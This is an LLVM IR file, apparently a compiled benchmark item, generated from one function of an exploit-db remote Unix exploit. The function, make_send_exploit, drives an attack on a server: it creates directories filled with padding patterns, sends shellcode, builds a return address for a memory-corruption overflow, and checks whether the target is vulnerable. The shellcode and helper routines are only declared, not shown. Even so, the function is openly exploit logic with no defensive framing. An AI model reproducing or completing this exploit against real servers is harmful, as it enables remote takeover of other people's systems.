; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/unix/remote/extr_22975.c_make_send_exploit.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/unix/remote/extr_22975.c_make_send_exploit.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@GET_R = common dso_local global i32 0, align 4
@t_g = common dso_local global i32 0, align 4
@stdout = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [37 x i8] c" [+] 01: make 0x41414141 directory.\0A\00", align 1
@.str.1 = private unnamed_addr constant [37 x i8] c" [+] 02: make shell-code directory.\0A\00", align 1
@.str.2 = private unnamed_addr constant [37 x i8] c" [+] 03: make 0x43434343 directory.\0A\00", align 1
@.str.3 = private unnamed_addr constant [37 x i8] c" [+] 04: make 0x44444444 directory.\0A\00", align 1
@.str.4 = private unnamed_addr constant [37 x i8] c" [+] 05: make 0x45454545 directory.\0A\00", align 1
@.str.5 = private unnamed_addr constant [37 x i8] c" [+] 06: make 0x46464646 directory.\0A\00", align 1
@.str.6 = private unnamed_addr constant [37 x i8] c" [+] 07: make 0x47474747 directory.\0A\00", align 1
@.str.7 = private unnamed_addr constant [37 x i8] c" [+] 08: make 0x48484848 directory.\0A\00", align 1
@.str.8 = private unnamed_addr constant [37 x i8] c" [+] 09: make 0x49494949 directory.\0A\00", align 1
@.str.9 = private unnamed_addr constant [37 x i8] c" [+] 10: make 0x50505050 directory.\0A\00", align 1
@.str.10 = private unnamed_addr constant [37 x i8] c" [+] 11: make 0x51515151 directory.\0A\00", align 1
@.str.11 = private unnamed_addr constant [37 x i8] c" [+] 12: make 0x52525252 directory.\0A\00", align 1
@.str.12 = private unnamed_addr constant [37 x i8] c" [+] 13: make 0x53535353 directory.\0A\00", align 1
@.str.13 = private unnamed_addr constant [37 x i8] c" [+] 14: make 0x54545454 directory.\0A\00", align 1
@.str.14 = private unnamed_addr constant [37 x i8] c" [+] 15: make 0x55555555 directory.\0A\00", align 1
@__exp_test = common dso_local global i64 0, align 8
@NRL = common dso_local global i64 0, align 8
@FAD = common dso_local global i32 0, align 4
@stderr = common dso_local global i32 0, align 4
@.str.15 = private unnamed_addr constant [30 x i8] c" [-] This isn't vulnerable.\0A\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @make_send_exploit(i32 %0, i32 %1, i32 %2, i32 %3) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8*, align 8
  %10 = alloca i64, align 8
  store i32 %0, i32* %5, align 4
  store i32 %1, i32* %6, align 4
  store i32 %2, i32* %7, align 4
  store i32 %3, i32* %8, align 4
  %11 = load i32, i32* @GET_R, align 4
  %12 = zext i32 %11 to i64
  %13 = call i8* @llvm.stacksave()
  store i8* %13, i8** %9, align 8
  %14 = alloca i8, i64 %12, align 16
  store i64 %12, i64* %10, align 8
  %15 = load i32, i32* @t_g, align 4
  switch i32 %15, label %136 [
    i32 0, label %16
    i32 1, label %16
    i32 2, label %16
    i32 3, label %112
    i32 4, label %112
    i32 5, label %112
    i32 6, label %112
    i32 7, label %112
    i32 8, label %112
  ]

16:                                               ; preds = %4, %4, %4
  %17 = load i32, i32* @stdout, align 4
  %18 = call i32 @fprintf(i32 %17, i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str, i64 0, i64 0))
  %19 = load i32, i32* %5, align 4
  %20 = load i32, i32* %8, align 4
  %21 = call i64 @mkd_cwd_f(i32 %19, i32 %20, i8* %14, i32 65)
  %22 = trunc i64 %21 to i32
  %23 = load i32, i32* @stdout, align 4
  %24 = call i32 @fprintf(i32 %23, i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.1, i64 0, i64 0))
  %25 = load i32, i32* %5, align 4
  %26 = load i32, i32* %8, align 4
  %27 = call i64 @send_shellcode(i32 %25, i32 %26, i8* %14)
  %28 = trunc i64 %27 to i32
  %29 = load i32, i32* @stdout, align 4
  %30 = call i32 @fprintf(i32 %29, i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.2, i64 0, i64 0))
  %31 = load i32, i32* %5, align 4
  %32 = load i32, i32* %8, align 4
  %33 = call i64 @mkd_cwd_f(i32 %31, i32 %32, i8* %14, i32 67)
  %34 = trunc i64 %33 to i32
  %35 = load i32, i32* @stdout, align 4
  %36 = call i32 @fprintf(i32 %35, i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.3, i64 0, i64 0))
  %37 = load i32, i32* %5, align 4
  %38 = load i32, i32* %8, align 4
  %39 = call i64 @mkd_cwd_f(i32 %37, i32 %38, i8* %14, i32 68)
  %40 = trunc i64 %39 to i32
  %41 = load i32, i32* @stdout, align 4
  %42 = call i32 @fprintf(i32 %41, i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.4, i64 0, i64 0))
  %43 = load i32, i32* %5, align 4
  %44 = load i32, i32* %8, align 4
  %45 = call i64 @mkd_cwd_f(i32 %43, i32 %44, i8* %14, i32 69)
  %46 = trunc i64 %45 to i32
  %47 = load i32, i32* @stdout, align 4
  %48 = call i32 @fprintf(i32 %47, i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.5, i64 0, i64 0))
  %49 = load i32, i32* %5, align 4
  %50 = load i32, i32* %8, align 4
  %51 = call i64 @mkd_cwd_f(i32 %49, i32 %50, i8* %14, i32 70)
  %52 = trunc i64 %51 to i32
  %53 = load i32, i32* @stdout, align 4
  %54 = call i32 @fprintf(i32 %53, i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.6, i64 0, i64 0))
  %55 = load i32, i32* %5, align 4
  %56 = load i32, i32* %8, align 4
  %57 = call i64 @mkd_cwd_f(i32 %55, i32 %56, i8* %14, i32 71)
  %58 = trunc i64 %57 to i32
  %59 = load i32, i32* @stdout, align 4
  %60 = call i32 @fprintf(i32 %59, i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.7, i64 0, i64 0))
  %61 = load i32, i32* %5, align 4
  %62 = load i32, i32* %8, align 4
  %63 = call i64 @mkd_cwd_f(i32 %61, i32 %62, i8* %14, i32 72)
  %64 = trunc i64 %63 to i32
  %65 = load i32, i32* @stdout, align 4
  %66 = call i32 @fprintf(i32 %65, i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.8, i64 0, i64 0))
  %67 = load i32, i32* %5, align 4
  %68 = load i32, i32* %8, align 4
  %69 = call i64 @mkd_cwd_f(i32 %67, i32 %68, i8* %14, i32 73)
  %70 = trunc i64 %69 to i32
  %71 = load i32, i32* @stdout, align 4
  %72 = call i32 @fprintf(i32 %71, i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.9, i64 0, i64 0))
  %73 = load i32, i32* %5, align 4
  %74 = load i32, i32* %8, align 4
  %75 = call i64 @mkd_cwd_f(i32 %73, i32 %74, i8* %14, i32 80)
  %76 = trunc i64 %75 to i32
  %77 = load i32, i32* @stdout, align 4
  %78 = call i32 @fprintf(i32 %77, i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.10, i64 0, i64 0))
  %79 = load i32, i32* %5, align 4
  %80 = load i32, i32* %8, align 4
  %81 = call i64 @mkd_cwd_f(i32 %79, i32 %80, i8* %14, i32 81)
  %82 = trunc i64 %81 to i32
  %83 = load i32, i32* @stdout, align 4
  %84 = call i32 @fprintf(i32 %83, i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.11, i64 0, i64 0))
  %85 = load i32, i32* %5, align 4
  %86 = load i32, i32* %8, align 4
  %87 = call i64 @mkd_cwd_f(i32 %85, i32 %86, i8* %14, i32 82)
  %88 = trunc i64 %87 to i32
  %89 = load i32, i32* @stdout, align 4
  %90 = call i32 @fprintf(i32 %89, i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.12, i64 0, i64 0))
  %91 = load i32, i32* %5, align 4
  %92 = load i32, i32* %8, align 4
  %93 = call i64 @mkd_cwd_f(i32 %91, i32 %92, i8* %14, i32 83)
  %94 = trunc i64 %93 to i32
  %95 = load i32, i32* @stdout, align 4
  %96 = call i32 @fprintf(i32 %95, i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.13, i64 0, i64 0))
  %97 = load i32, i32* %5, align 4
  %98 = load i32, i32* %8, align 4
  %99 = call i64 @mkd_cwd_f(i32 %97, i32 %98, i8* %14, i32 84)
  %100 = trunc i64 %99 to i32
  %101 = load i32, i32* @stdout, align 4
  %102 = call i32 @fprintf(i32 %101, i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.14, i64 0, i64 0))
  %103 = load i32, i32* %5, align 4
  %104 = load i32, i32* %8, align 4
  %105 = call i64 @mkd_cwd_f(i32 %103, i32 %104, i8* %14, i32 85)
  %106 = trunc i64 %105 to i32
  %107 = load i32, i32* %5, align 4
  %108 = load i32, i32* %6, align 4
  %109 = load i32, i32* %7, align 4
  %110 = call i64 @make_retloc(i32 %107, i32 %108, i8* %14, i32 %109)
  %111 = trunc i64 %110 to i32
  br label %136

112:                                              ; preds = %4, %4, %4, %4, %4, %4
  %113 = load i32, i32* @stdout, align 4
  %114 = call i32 @fprintf(i32 %113, i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str, i64 0, i64 0))
  %115 = load i32, i32* %5, align 4
  %116 = load i32, i32* %8, align 4
  %117 = call i64 @mkd_cwd_f(i32 %115, i32 %116, i8* %14, i32 65)
  %118 = trunc i64 %117 to i32
  %119 = load i32, i32* @stdout, align 4
  %120 = call i32 @fprintf(i32 %119, i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.1, i64 0, i64 0))
  %121 = load i32, i32* %5, align 4
  %122 = load i32, i32* %8, align 4
  %123 = call i64 @send_shellcode(i32 %121, i32 %122, i8* %14)
  %124 = trunc i64 %123 to i32
  %125 = load i32, i32* @stdout, align 4
  %126 = call i32 @fprintf(i32 %125, i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.2, i64 0, i64 0))
  %127 = load i32, i32* %5, align 4
  %128 = load i32, i32* %8, align 4
  %129 = call i64 @mkd_cwd_f(i32 %127, i32 %128, i8* %14, i32 67)
  %130 = trunc i64 %129 to i32
  %131 = load i32, i32* %5, align 4
  %132 = load i32, i32* %6, align 4
  %133 = load i32, i32* %7, align 4
  %134 = call i64 @make_retloc(i32 %131, i32 %132, i8* %14, i32 %133)
  %135 = trunc i64 %134 to i32
  br label %136

136:                                              ; preds = %4, %112, %16
  %137 = load i32, i32* %6, align 4
  %138 = icmp ne i32 %137, 0
  br i1 %138, label %139, label %155

139:                                              ; preds = %136
  %140 = load i64, i64* @__exp_test, align 8
  %141 = icmp ne i64 %140, 0
  br i1 %141, label %142, label %155

142:                                              ; preds = %139
  %143 = load i64, i64* @NRL, align 8
  store i64 %143, i64* @__exp_test, align 8
  %144 = load i32, i32* %5, align 4
  %145 = call i64 @check_exp(i32 %144)
  %146 = trunc i64 %145 to i32
  %147 = load i32, i32* @FAD, align 4
  %148 = icmp eq i32 %146, %147
  br i1 %148, label %149, label %154

149:                                              ; preds = %142
  %150 = load i32, i32* @stderr, align 4
  %151 = call i32 @fprintf(i32 %150, i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.15, i64 0, i64 0))
  %152 = load i32, i32* @FAD, align 4
  %153 = call i32 @exit(i32 %152) #4
  unreachable

154:                                              ; preds = %142
  br label %155

155:                                              ; preds = %154, %139, %136
  %156 = load i8*, i8** %9, align 8
  call void @llvm.stackrestore(i8* %156)
  ret void
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

declare dso_local i32 @fprintf(i32, i8*) #2

declare dso_local i64 @mkd_cwd_f(i32, i32, i8*, i32) #2

declare dso_local i64 @send_shellcode(i32, i32, i8*) #2

declare dso_local i64 @make_retloc(i32, i32, i8*, i32) #2

declare dso_local i64 @check_exp(i32) #2

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #3

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
